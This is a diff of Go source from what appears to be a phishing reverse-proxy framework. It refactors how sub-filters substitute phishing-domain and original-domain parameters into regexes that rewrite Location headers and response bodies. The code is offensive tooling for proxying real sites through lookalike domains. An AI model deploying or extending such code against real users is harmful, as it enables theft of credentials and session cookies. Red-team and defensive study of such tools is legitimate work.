@@ -1346,48 +1346,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 								if (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
-									if stringExists("location", sf.location) && param_ok {
-										if re, err := regexp.Compile(sf.regexp); err == nil {
+									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+									phish_subdomain, _ := p.getPhishSub(phish_hostname)
+									phish_domain, _ := p.cfg.GetSiteDomain(pl.Name)
+									params := map[string]string{
+										"phish_hostname":phish_hostname,
+										"phish_subdomain":phish_subdomain,
+										"phish_domain":phish_domain,
+										"orig_hostname":combineHost(sf.subdomain, sf.domain),
+										"orig_subdomain":sf.subdomain,
+										"orig_domain":sf.domain,
+										"phish_basedomain":p.cfg.GetBaseDomain(),
+									}
+									if s, ok := p.sessions[ps.SessionId]; ok {
+										maps.Copy(params, s.Params)
+									}
+									re_s := ReplaceParams(sf.regexp, params)
+									replace_s := ReplaceParams(sf.replace, params)
+									if re, err := regexp.Compile(re_s); err == nil {
+										if stringExists("location", sf.location) && param_ok {
 											location := resp.Header.Get("Location")
 											if location != "" {
-													location = re.ReplaceAllString(string(location), sf.replace)
-													resp.Header.Set("Location", location)
+												location = re.ReplaceAllString(string(location), replace_s)
+												resp.Header.Set("Location", location)
 											}
-										} else {
-											log.Error("regexp failed to compile: `%s`", sf.regexp)
 										}
-									}
-									if stringExists("body", sf.location) {
-										if stringExists(mime, sf.mime) {
-											re_s := sf.regexp
-											replace_s := sf.replace
-											phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
-											phish_sub, _ := p.getPhishSub(phish_hostname)
-											phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
-
-											params := map[string]string{
-												"phish_hostname":phish_hostname,
-												"phish_subdomain":phish_sub,
-												"phish_domain":phishDomain,
-												"orig_hostname":combineHost(sf.subdomain, sf.domain),
-												"orig_subdomain":sf.subdomain,
-												"orig_domain":sf.domain,
-												"phish_basedomain":p.cfg.GetBaseDomain(),
-											}
-
-											if s, ok := p.sessions[ps.SessionId]; ok {
-												maps.Copy(params, s.Params)
-											}
-											
-											re_s = ReplaceParams(re_s, params)
-											replace_s = ReplaceParams(replace_s, params)
-
-											if re, err := regexp.Compile(re_s); err == nil {
+										if stringExists("body", sf.location) {
+											if stringExists(mime, sf.mime) {
 												body = []byte(re.ReplaceAllString(string(body), replace_s))
-											} else {
-												log.Error("regexp failed to compile: `%s`", sf.regexp)
 											}
 										}
+									} else {
+										log.Error("regexp failed to compile: `%s`", sf.regexp)
 									}
 								}
 							}
